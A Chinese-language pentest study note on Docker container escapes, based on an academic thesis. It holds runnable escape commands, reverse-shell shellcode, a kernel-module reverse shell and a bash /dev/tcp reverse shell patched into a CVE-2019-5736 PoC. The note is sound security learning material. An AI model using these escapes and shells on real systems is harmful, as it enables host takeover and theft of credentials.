# 渗透思路调研



> 有次项目中通过漏洞反弹Shell就没有了后续操作，这很容易遗漏掉重要系统。  
> 根据后来对系统的了解是采用了Docker来部署Jira、Jenkins等服务，但之前对于Docker的了解只在于如何使用拉取镜像，没有考虑到Docker相关的安全问题并且利用扩大渗透成果，例如,如何判断获取主机是否为Docker，有哪些工具可以提高效率，怎么通过Docker逃逸控制宿主机等后渗透攻击手法。  
> 临时去查阅资料研究怎么逃逸，需要什么条件下才能触发，有哪些漏洞可以利用都已经晚了，而且随意操作有可能导致系统崩溃，为了后续遇到Docker可以成功利用，对Docker容器安全进行调研。

主要参考荷兰大学论文：

`A Methodology for Penetration Testing Docker Systems`

根据论文将所有攻击手法梳理出来：

![](../../.gitbook/assets/image%20%28582%29.png)

![](../../.gitbook/assets/image%20%28588%29.png)

## Docket简介

Docker 使用Google公司推出的 Go 语言进行开发实现，基于Linux内核的cgroup、namespace，以及AUFS类的Union FS等技术，对进程进行封装隔离，属于操作系统层面的虚拟化技术。

虚拟化是一种资源管理技术，将计算机实体资源，如服务器、网络、内存等予以抽象转换后呈现出来，在同一主机上同时运行多个系统从而提高系统资源的利用率，降低成本方便管理和容错等好处。

![](../../.gitbook/assets/image%20%28604%29.png)

传统方式是在硬件层面实现虚拟化，需要额外的虚拟机管理应用和虚拟机操作系统层，Docker容器是在操作系统层面上实现虚拟化，直接复用本地主机操作系统，因此更加轻量级。

Docker引擎由如下主要组件构成：Docker客户端（Docker Client）、Docker守护进程（Docker daemon）、containerd以及runc。它们共同负责容器的创建和运行。

![](../../.gitbook/assets/image%20%28583%29.png)

### Docker Client

Docker Client是和Docker Daemon建立通信客户端，Docker Client可以通过三种方式和Daemon建立通信：

* tcp://host:port
* unix://path\_to\_socket
* fd://socketfd

### Docker daemon

Docker daemon在宿主机后运行，作为服务端接受来自客户端的请求，主要功能包括镜像管理、镜像构建、REST API、身份验证、安全、核心网络以及编排。

Docker daemon通过位于/var/run/docker.sock的本地IPC/Unix socket来实现Docker远程API,默认非TLS网络端口为2375，TLS默认端口为2376。

### Docker Images

运行容器前需要本地存在对应的镜像，如果不存在默认会从Docker Hub镜像仓库下载。  
镜像由多个层组成，每层叠加之后外部来看就如一个独立的对象，镜像内部是一个精简的操作系统同时包含应用运行所必须的文件和依赖包。

### Docker Containers

容器是操作系统虚拟化将系统资源划分为虚拟资源。容器并不是完整的操作系统，启动要远比虚拟机快，容器内部并不需要内核，也就没有定位、解压以及初始化的过程。

Docker client选择合适的API调用Docker daemon，daemon接收到命令并搜索Docker本地缓存，观察是否有命令所请示的镜像。Linux默认安装时，客户端与daemon之间的通信是通过本地IPC/UNIX Socket完成的（/var/run/docker.sock）

runC  
runc是一个轻量级的针对Libcontainer进行了馐的命令行交互工具，取代了早期Docker架构中的LXC。  
runc只有一个作用，创建容器。

## 容器执行流程

```bash
docker container run --name ctrl -it alpine:latest sh
```

* 当执行如上命令时，Docker Client会将其转换为合适的API格式，并发送到正确的API端点。
* 一旦daemon接收到创建新容器的命令，会向containerd发出调用。
  * 虽然名字叫containerd但是它不负责创建新容器，而是指挥runc去做。

    containerd将Docker镜像转换为OCI bundle，并让runc基于此创建一个新的容器。
* daemon使用一种CRUD风格的API，通过gRPC与containerd进行通信。
* 然后runc与操作系统内核接口进行通信，基于所有必要的工具（Namespace、CGroup等）来创建容器。

  容器进程作为runc的子进程启动，启动完后runc将会退出。

* shim是实现无daemon的容器
  * containerd指挥runc创建新容器，实际上创建容器时都会fork一个新的runc实例。
  * 一旦容器进程的父进程runc退出，相关联的containerd-shim就会成为容器的父进程。
  * shim职责是保持所有STDIN和STDOUT流是开启状态，从而当daemon重启的时候，容器不会因为PIPE的关闭而终止，并且将容器退出状态反馈给daemon。

虚拟机和容器最大的区别是容器更快并且更轻量级，与虚拟机运行在完整的操作系统相比，容器会共享其所在主机的操作系统、内核。

![](../../.gitbook/assets/image%20%28579%29.png)

### Data Persistence

Docker的数据主要分为两类：持久化和非持久化数据，默认情况下非持久化存储是自动创建生命周期与容器相同，删除容器也会删除非持久化数据，非持久化数据默认存储于Linux：/var/lib/docker//之下。

如果希望将容器数据保留下来，需要将数据存储于卷上，默认情况下，容器的所有存储都使用本地存储。

### Docker network

* Docker网络架构源自一种叫作容器网络模型的方案，Libnetwork是Docker对CNM的一种实现，提供了Docker核心网络架构的全部功能。
* Docker网络架构由3个主要部分构成：
  * CNM
  * Libnetwork
  * 驱动

Libnetwork通过Go语言编写，并实现了CNM中列举的核心组件。  
驱动通过实现特定网络拓扑的方式来拓展该模型的能力。

## Docker安全机制

![](../../.gitbook/assets/image%20%28605%29.png)

利用了大部分Linux通用安全技术，这些技术包括了命名空间（Namespace）、控制组（CGroup）、系统权限（Capability）、强制访问控制（MAC）等。

* Docker Swarm模式
  * 默认是开启安全功能，就可以获得加密节点ID、双向认证、自动化CA配置、自动证书更新、加密集群存储、加密网络等安全功能。
* Docker内容信任（Docker Content Trust,DCT）
  * 允许用户对镜像签名，并且拉取镜像的完整度和发布者进行验证。
* Docker安全扫描（Docker Security Scanning）
  * 分析Docker镜像，检查已知缺陷，并提供对应的详细报告。
* Docker密钥
  * 密钥存储在加密集群存储中，在容器传输过程中实时解密，并运行了一个最小权限模型。

### Namespace

* 内核命名空间属于容器非常核心的一部分，能够将操作系统进行拆分，使一个系统看起来像多个互相独立的操作系统一样。
* Docker容器是由各种命名空间组合而成的，本质就是命名空间的有组织集合。
* 每个容器都由自己的PID、NET、MNT、IPC、UTS构成。

### Control Group

命名空间用于隔离，那么控制组就是用于限额。  
容器之间是互相隔离的，但却共享OS资源，比如CPU、RAM以及IO。CGroup允许用户设置限制，这样单个容器就不能占用主机的CPU、RAM等资源了。

### Capability

以root身份运行容器不是很安全，root拥有全部的权限，因此很危险，如果以非root身份运行容器那么将处处受，所以需要一种技术，能选择容器运行所需的root用户权限。

在底层，Linux root由许多能力组成，包括以下几点：

* CAP\_CHOWN - 允许用户修改文件所有权
* CAP\_NET\_BIND\_SERVICE - 允许用户将socket绑定到系统端口号
* CAP\_SETUID - 允许用户提升进程优先级
* CAP\_SYS\_BOOT - 允许用户重启系统

Docker采用Capability机制来实现用户在以root身份运行容器的同时，还能移除非必须的root能力。

Seccomp  
Docker使用过滤模式下的Seccomp来限制容器对宿主机内核发起的系统调用。  
每个新容器都会设置默认的Seccomp配置。

### Attacker Models

![](../../.gitbook/assets/image%20%28575%29.png)

整个容器环境的潜在攻击面和攻击对象，由四类威胁：  
但实际最为重点的是，容器逃逸和针对Docker守护进程的攻击。

## 识别容器

要判断目标环境是不是容器，才谈得上容器逃逸，为后续渗透做更多准备。

* 容器环境许多常用命令不存在，例如ping、ipconfig、netstat等都没有；
* 成熟的业务不会直接通过容器进行部署，而是采用Kubernetes编排统一编排和调度，其中K8s每个Pod是一台逻辑主机，目标容器所在的Pod可能存在其它的容器。
* 容器依赖了什么镜像，镜像是否包含有漏洞？
* Docker的API端口是否有未授权和暴露在外面？
* 目标是k8s等集群系统，是否会有更多的宿主机节点存在相同安全问题？

  如何在这样环境中横向移动？

### .dockerenv

判断根目录下 **/.dockerenv** 文件

```bash
ls -alh /.dockerenv
```

`/.dockerenv`是所有容器中都会存在这个文件，这个文件曾是LCX用于环境变量加载到容器中，现在容器不再使用LCX所以内容为空，通过这种方式来识别当前环境是否在容器中。

### Control Group

为了限制容器的资源，Docker为每个容器创建了一个控制组以及一个名为docker的父控制组，如果某个进程在Docker容器中启动，则该进程将必须在该容器控制中，所以通过查看初始进程的cgroup来验证是否为容器。

检查/proc/1/cgroup内是否包含docker等字符串

```text
cat /proc/1/cgroup |grep "docker"
```

## 运行进程

当前环境内进程是否少于5个？

```bash
ps aux
```

在系统进程中有一个根进行，ID为1，而且在容器中不会看到关于init或者systemd进程，而容器仅运行一个进程而不是完整的操作系统进程，所以可以通过系统进程数来判断是否为容器。

## 缺失程序

Docker的镜像会尽可能的小，只保留一些必要的库，而一些像常用的命令、gcc库都会被去除保证最小化，那么可以通过最基本的ping命令都不存在，可能是在Docker环境中。

当前环境是否常用的命令都不存在？

> ping、sudo、ifconfig、ssh、vi、gcc

mount命令查看

![](../../.gitbook/assets/image%20%28593%29.png)

Docker容器环境检测方法【代码】  
https://blog.csdn.net/hsluoyc/article/details/51075230

**关于如何检测当前权限是否容器，那么也应该会对应如何反检测。**

#### 容器信息收集

* 当前环境哪些用户？ `cat /etc/passwd`
* 容器操作系统？ `cat /etc/os-release`
* 宿主机内核版本？ `uname -a`
* 容器内进程具有哪些权限（capabilities）？ Docker上执行 `grep CapEff /proc/self/status` 获得权限值

其他系统上执行  
`capsh --decode=value`

* 当前容器是否运行在特权模式？ 0000003fffffffff为特权模式值
* 容器挂载了哪些卷？ `cat /proc/mounts`

检测`/proc/mounts`是否有包含`docker.sock`，如果发现了能够进行容器逃逸。

* 查看Docker版本 `docker --version`

#### 宿主机信息收集

哪些用户可以使用docker？  
`grep docker /etc/group`

当前宿主机可用镜像？  
`docker images -a`

当前运行哪些容器？  
`docker ps -a`

Docker守护进程启动参数，读取配置文件：

> /usr/lib/systemd/system/docker.service  
> /etc/docker/daemon.json  
> find / -name “docker-compose._“  
> cat /home/_/.docker/config.json

## 错误配置

### 未授权访问

```text
curl localhost:2375/version
```

![](../../.gitbook/assets/image%20%28591%29.png)

```text
export DOCKER_HOST="tcp://localhost:2375"
```

将宿主机目录挂载Docker/host/目录下，并通过chroot切换bash

> ```bash
> docker images
> docker run -it -v /:/host/ ubuntu:18.04 bash
> cd /host/
> chroot ./ bash
> cat /etc/shadow
> ```

![](../../.gitbook/assets/image%20%28599%29.png)

#### 挂载Docker Socket

当容器可以访问docker socket时，可以通过与daemon的通信对其进行恶意操纵完成逃逸，容器A能访问docker socket便可在容器中安装docker client，通过docket.sock与宿主机进行交互，运行并切换至不安全的容器B中控制宿主机。

利用条件：

* 一个容器权限
* 拥有访问Docket Socket权限。

查找docker socket  


![](../../.gitbook/assets/image%20%28590%29.png)

安装docker client  
apt-get install docker.io

查看当前镜像  
docker images

运行一个Ubuntu容器，将宿主机的根目录挂载到容器中的host目录上：  
docker run -it -v /:/host/ ubuntu:18.04 bash

在新容器执行，将根目录换成指定的目录：  
chroot ./ bash  


![](../../.gitbook/assets/image%20%28587%29.png)

基本从容器中逃逸出来了，可以往crontab写计算任务反弹Shell进行操控。

**环境构建**

下载ubuntu14

```bash
docker run -it -v /var/run/:/host/var/run/ ubuntu:14.04 /bin/bash
```

更新源

```bash
deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties
deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted
deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe
deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties
deb http://mirrors.aliyun.com/ubuntu/ xenial universe
deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe
deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse
deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse
deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties
deb http://archive.canonical.com/ubuntu xenial partner
deb-src http://archive.canonical.com/ubuntu xenial partner
deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties
deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe
deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse
```

安装docker client环境

```text
apt-get install docker.io
```

查看宿主机信息:

```text
docker -H unix:///host/var/run/docker.sock info
```

#### Privileged Mode

在特权模式下运行不完全受控容器，将会给宿主机带来极大安全威胁，当执行：  
docker run —privileged

Docker将允许容器访问宿主机上的设备，也拥有修改AppArmor或者SeLinux的权限，相当于就是宿主权限。

当管理员使用特权运行容器时：

```text
docker run -it --rm --privileged ubuntu:latest bash
```

其中特权模式下可以看到宿主机上的设备，直接进行挂载磁盘，然后将根目录切换过去。

```text
fdisk -l
mkdir /host
mount /dev/vda1 /host
cd /host
chroot ./ bash
```

![](../../.gitbook/assets/image%20%28603%29.png)

#### Capabilities

容器社区一直在努力将**纵深防御、最小权限等理念和原则落地**，目前Docker已经将Capabilities黑名单机制改为了默认禁止所有Capabilities，再以白名单方式赋予容器运行所需的最小权限。

如果用户启动容器时指定参数，那么使用了一些危害参数那么很可能给攻击者提供了一定程度逃逸的可能性。

**CAP\_SYS\_ADMIN**

启动容器指定CAP\_SYS\_ADMIN：

```text
docker run —rm -it —cap-add=CAP_SYS_ADMIN —security -opt apparmor=unconfined ubuntu /bin/bash
```

通过capsh查看：

```text
capsh —print
```

![](../../.gitbook/assets/image%20%28574%29.png)

容器目前是具备有管理功能，并且可以访问到宿主机上的磁盘

```text
fdisk -l
```

![](../../.gitbook/assets/image%20%28581%29.png)

查看宿主机shadow

![](../../.gitbook/assets/image%20%28596%29.png)

通过nc扫描宿主机网络，一般网关地址都为宿主机

```text
nc -v -n w2 -z 172.17.0.1 1-65535
```

![](../../.gitbook/assets/image%20%28602%29.png)

使用chroot在/mnt创建用户

```text
chroot /mnt/ adduser john
```

连接宿主机

```text
ssh john@172.17.0.1 -p 2222
```

**SYS\_PTRACE**

拥有SYS\_PTRACE权限可以通过进程注入达到逃逸  
查找HTTP服务器的PID  
ps -eaf

生成反弹shellcode

> \x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02 \x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x 0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x4 8\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05

进程注入程序：  
https://0x00sec.org/t/linux-infecting-running-processes/1097  
https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c

```bash
gcc inject.c -o inject
./inject 733
nc 172.17.0.1 5600
```

**SYS\_MODULE**

reverse.c

```c
#include <linux/kmod.h>#include <linux/module.h>char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.17.0.2/4444 0>&1", NULL};static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };static int __init reverse_shell_init(void) {    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

Makefile

```c
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

insmod reverse-shell.ko
```

![](../../.gitbook/assets/image%20%28600%29.png)

```text
nc -v -l -p 4444
```

#### Portainer后台拿Shell（逃逸）

原理就是创建容器挂载宿主机目录，通过chroot切换Shell  
后台没有默认帐号密码，当第一次登录系统会提示设置新密码。  
进入容器中：  


![](../../.gitbook/assets/image%20%28580%29.png)

![](../../.gitbook/assets/image%20%28578%29.png)

添加容器：  


![](../../.gitbook/assets/image%20%28584%29.png)

填写内容，境像随便找一个：  


![](../../.gitbook/assets/image%20%28592%29.png)

重点是添加Volumes

![](../../.gitbook/assets/image%20%28589%29.png)

  
挂载根目录：  


![](../../.gitbook/assets/image%20%28601%29.png)

之后部署：  


![](../../.gitbook/assets/image%20%28595%29.png)

部署成功后回到容器中：  
进入到终端

![](../../.gitbook/assets/image%20%28594%29.png)

![](../../.gitbook/assets/image%20%28597%29.png)

**在实战中往往创建一个容器启动不起来。**  
可以先进入Stacks进入到一个已启动的容器中：  
从这里面挂载宿主根目录。

![](../../.gitbook/assets/image%20%28576%29.png)

回到Containers中，进入终端

  
将/host目录设置为当前终端目录

![](../../.gitbook/assets/image%20%28573%29.png)

```text
chroot /host/ bash
```

![](../../.gitbook/assets/image%20%28586%29.png)

使用Ubuntu20做宿主机

![](../../.gitbook/assets/image%20%28598%29.png)

发现无法连通外网，添加DNS就可以了：

```text
vim /etc/resolv.conf
nameserver 8.8.8.8
```

目前已经通过Portainer后台控制宿主机，并且能够执行root权限任意命令，在实战中，网卡涉及到内网中可以在这台主机直接建立隧道代理。  
只要能够进入到后台，什么都好说。

### 容器漏洞

#### CVE-2019-5736

攻击者可以修改runc的二进制文件导致提权，需要管理员执行exec才能触发，条件有限。

版本漏洞：  
docker version &lt;=18.09.2  
RunC version &lt;=1.0-rc6

下载bash脚本，安装环境：  
https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw/

安装Go

```bash
wget https://storage.googleapis.com/golang/go1.9.linux-amd64.tar.gz
tar xf go1.9.linux-amd64.tar.gz
mv go /usr/local
vim /etc/profile
export GOROOT=/usr/local/go
export GOPATH=$HOME/work
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
source /etc/profile
go version
go env
```

下载POC  
https://github.com/Frichetten/CVE-2019-5736-PoC  
编译  
CGO\_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go

将编译的main复制到docker容器中，实际中肯定是想各种办法放到容器中

```bash
docker cp main name:/home
docker exec -it name bash
cd /home/
chmod 777 main
./main
```

此时等管理员进入容器将触发：

```bash
docker exec -it name /bin/bash
```

或者将POC中的获取/etc/shadow改为反弹Shell,将第16行改为反弹Shell，获得宿主机权限。

```text
bash -i >& /dev/tcp/123.123.123.123/8080 0>& 1
```

![](../../.gitbook/assets/image%20%28572%29.png)

#### Dirty Cow（CVE-2016-5195）

漏洞能否利用成功，主要是看宿主机内核版本，较高无法成功。  
漏洞EXP

```text
https://github.com/scumjr/dirtycow-vdso
cd /dirtycow-vdso/
make
./0xdeadbeef
```

在线漏洞环境、说明：  
https://www.ichunqiu.com/experiment/detail?id=100297&source=2

### Other相关内容

Clair  
容器漏洞静态分析  
https://github.com/quay/clair

安全防护工具之：Clair\_知行合一  
https://blog.csdn.net/liumiaocn/article/details/76697022  
通过对容器的layer扫描，发现漏洞并进行预警。  
Metasploit模块

判断目标环境是否为Docker  
post/linux/gather/checkcontainer

查看Docker版本  
auxiliary/scanner/http/docker\_version

利用daemon执行命令，需要Daemon远程访问。  
exploit/linux/http/docker\_daemon\_tcp

docker socket容器逃逸  
exploit/linux/local/docker\_daemon\_privilege\_escalation

检测目标环境中各种漏洞缓解机制是否开启  
post/linux/gather/enum\_protections

解析获得认证凭据  
post/multi/gather/docker\_creds

其它工具：  
https://github.com/kost/dockscan  
https://github.com/genuinetools/amicontained  
https://github.com/falcosecurity/falco  
https://github.com/ianxtianxt/docker\_api\_vul

云平台：

* Portainer
* Dive
* Docker Compose UI
* Seagull

### 参考阅读文章

何兰大学docker论文  
https://www.cs.ru.nl/bachelors-theses/2020/Joren\_Vrancken\_\_\_4593847\_\_\_A\_Methodology\_for\_Penetration\_Testing\_Docker\_Systems.pdf

CVE-2019-5736 Docker逃逸  
https://bestwing.me/CVE-2019-5736-Docker-escape.html

Docker逃逸小结 第一版  
https://xz.aliyun.com/t/7881\#toc-3

容器逃逸技术概览  
https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan/

从 Docker 安全机制探究 Docker 逃逸  
https://xz.aliyun.com/t/6167

针对容器的渗透测试方法  
https://wohin.me/zhen-dui-rong-qi-de-shen-tou-ce-shi-fang-fa/

云原生环境渗透工具考察  
https://wohin.me/yun-yuan-sheng-huan-jing-shen-tou-xiang-guan-gong-ju-kao-cha/

